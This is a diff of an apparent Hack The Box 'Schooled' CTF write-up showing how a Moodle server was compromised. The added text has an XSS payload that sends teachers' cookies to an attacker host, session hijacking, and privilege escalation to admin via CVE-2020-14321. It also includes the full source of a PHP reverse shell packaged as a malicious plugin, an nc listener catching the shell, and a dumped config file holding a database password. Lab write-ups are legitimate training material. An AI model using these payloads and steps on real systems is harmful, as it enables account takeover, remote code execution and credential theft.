@@ -220,7 +220,7 @@ Ok, I think we need to start searching some CVE for *moodle*.
 * https://www.cybersecurity-help.cz/vdb/SB2020072004
 * https://www.cybersecurity-help.cz/vulnerabilities/31682/
 
-First link says us dbout XSS attacks (A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website.). 
+First link says us about XSS attacks (A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website.). 
 
 Second link says that remote authenticated attacker with teacher permission can escalate privileges from teacher role into manager role.
 
@@ -230,21 +230,405 @@ We knows that teacher will check links of MoodleNet in student's profiles form t
 
 We can steel cookie's teacher with XSS attack. There is the good [article](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md) about it.
 
-Let's edit our profile and use this XSS.
+Let's edit our profile and use this XSS. `<script>var i=new Image;i.src="http://10.10.14.73:8000/?"+document.cookie;</script>`
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134009.png)
+
+Starting local http server and getting teacher's cookie.
 
 ```
-<script>var i=new Image;i.src="http://10.10.14.73:8000/?"+document.cookie;</script>
+┌──(root💀kali)-[/home/kali/HTB/Schooled]
+└─# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.14.73 - - [01/May/2021 02:44:10] "GET /?MoodleSession=02qscopk1nmvgvngqlogkkle2n HTTP/1.1" 200 -
+10.10.10.234 - - [01/May/2021 02:45:16] "GET /?MoodleSession=na6bmqb1fb3soej8k7rdlflv9m HTTP/1.1" 200 -
 ```
 
-Start local http server and waiting cookie.
+Now we need to replace our cookie with this. 
+
+In Firefox we nedd to select *Inspect Elemet*, go to *Storage* and replace *cookie*.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134909.png)
+
+Reload current page and our profile becomes profile of teacher Manuel Philips.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134943.png)
+
+Ok, now we are the teacher in *moodle*, so we will do same like in [video](https://www.youtube.com/watch?v=BkEInFI4oIU) to get RCE.
+
+1. We need to go to our course *Math* and select *Participants*. Next step we enroll user with manager role (we remember,that Liane Carter is manager). In the end we intercept the request in burp forward it to repeater and change the user_ID and Assign_ID of Teacher(Manuel Phillips) to become admin and forward the request to enroll Manager.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140027.png)
+
+And teacher becomes manager.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140353.png)
+
+We select *login as Administrator* and our teacher becomes *Admin*
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140720.png)
+
+2. Now we need to get RCE. Going to *Users* -> *Permissions* -> *Define Roles*
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_142006.png)
+
+And edit manager's role. We need to intercept the request in burp when we click *Save changes* and replace it on [payload](https://github.com/HoangKien1020/CVE-2020-14321)
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)
+
+After this we need to go plugins and dowload our payload.
+
+We download payload from this [link](https://github.com/HoangKien1020/Moodle_RCE), unzip it replae php web shell wuth php reverse shell and zip it again.
 
 ```
+┌──(root💀kali)-[/home/kali/HTB/Schooled]
+└─# cd Moodle_RCE  
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
+└─# ls
+rce  rce.zip  README.md
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
+└─# rm rce.zip
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
+└─# cd rce/lang/en 
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
+└─# ls
+block_rce.php                                                                                                                                                                  
+                                                                                                                                                                          
+┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
+└─# cat block_rce.php                                                                                                                                                130 ⨯
+<?php
 
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.14.73';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+
+        // Make the current process a session leader
+        // Will only succeed if we forked
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        // Check for end of TCP connection
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        // Check for end of STDOUT
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        // Wait until a command is end down $sock, or some
+        // command output is available on STDOUT or STDERR
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        // If we can read from the TCP socket, send
+        // data to process's STDIN
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        // If we can read from the process's STDOUT
+        // send data down tcp connection
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        // If we can read from the process's STDERR
+        // send data down tcp connection
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?> 
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
+└─# cd /home/kali/HTB/Schooled/Moodle_RCE 
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
+└─# ls
+rce  README.md
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
+└─# zip -r rce.zip rce
+  adding: rce/ (stored 0%)
+  adding: rce/lang/ (stored 0%)
+  adding: rce/lang/en/ (stored 0%)
+  adding: rce/lang/en/block_rce.php (deflated 65%)
+  adding: rce/version.php (deflated 11%)
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
+└─# ls
+rce  rce.zip  README.md
 ```
 
+In *Plugins* select *Install Plugins* and upload our rce.zip
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)
+
+Start listener. Select *Continue*.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)
+
+And we get Reverse Shell
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Schooled]
+└─# nc -lvp 4444      
+listening on [any] 4444 ...
+connect to [10.10.14.73] from schooled.htb [10.10.10.234] 17063
+FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64
+ 8:47AM  up 14:17, 0 users, load averages: 0.75, 0.71, 0.71
+USER       TTY      FROM    LOGIN@  IDLE WHAT
+uid=80(www) gid=80(www) groups=80(www)
+sh: can't access tty; job control turned off
+$ hostname
+Schooled
+$ pwd
+/
+```
 
 # Privilege Escalation#1
 
+Ok, I can't upgrade my reverse shell and can't use wget or netcat. So we will find some credentials manually.
+
+I think we should to find moodle's directory.
+
+```
+$ locate moodle
+/usr/local/www/apache24/data/moodle
+```
+
+Let's check the directory...
+
+```
+$ cd /usr/local/www/apache24/data/moodle 
+$ ls
+CONTRIBUTING.txt
+COPYING.txt
+Gruntfile.js
+GruntfileComponents.js
+INSTALL.txt
+PULL_REQUEST_TEMPLATE.txt
+README.txt
+TRADEMARK.txt
+admin
+analytics
+auth
+availability
+babel-plugin-add-module-to-define.js
+backup
+badges
+behat.yml.dist
+blocks
+blog
+brokenfile.php
+cache
+calendar
+cohort
+comment
+competency
+completion
+composer.json
+composer.lock
+config-dist.php
+config.php
+contentbank
+course
+customfield
+dataformat
+draftfile.php
+enrol
+error
+favourites
+file.php
+files
+filter
+githash.php
+grade
+group
+h5p
+help.php
+help_ajax.php
+index.php
+install
+install.php
+iplookup
+lang
+lib
+local
+login
+media
+message
+mnet
+mod
+my
+notes
+npm-shrinkwrap.json
+package.json
+phpunit.xml.dist
+pix
+plagiarism
+pluginfile.php
+portfolio
+privacy
+question
+rating
+report
+repository
+rss
+search
+tag
+theme
+tokenpluginfile.php
+user
+userpix
+version.php
+webservice
+$ 
+```
+
+And we find many files in this directory. Let's try to find some credentials here.
+
+In the file *config.php* we find credentials for connection to mysql.
+
+```
+$ cat config.php
+<?php  // Moodle configuration file
+
+unset($CFG);
+global $CFG;
+$CFG = new stdClass();
+
+$CFG->dbtype    = 'mysqli';
+$CFG->dblibrary = 'native';
+$CFG->dbhost    = 'localhost';
+$CFG->dbname    = 'moodle';
+$CFG->dbuser    = 'moodle';
+$CFG->dbpass    = 'PlaybookMaster2020';
+$CFG->prefix    = 'mdl_';
+$CFG->dboptions = array (
+  'dbpersist' => 0,
+  'dbport' => 3306,
+  'dbsocket' => '',
+  'dbcollation' => 'utf8_unicode_ci',
+);
+
+$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
+$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
+$CFG->admin     = 'admin';
+
+$CFG->directorypermissions = 0777;
+
+require_once(__DIR__ . '/lib/setup.php');
+
+// There is no php closing tag in this file,
+// it is intentional because it prevents trailing whitespace problems!
+```
 
 # Privilege Escalation#2
 
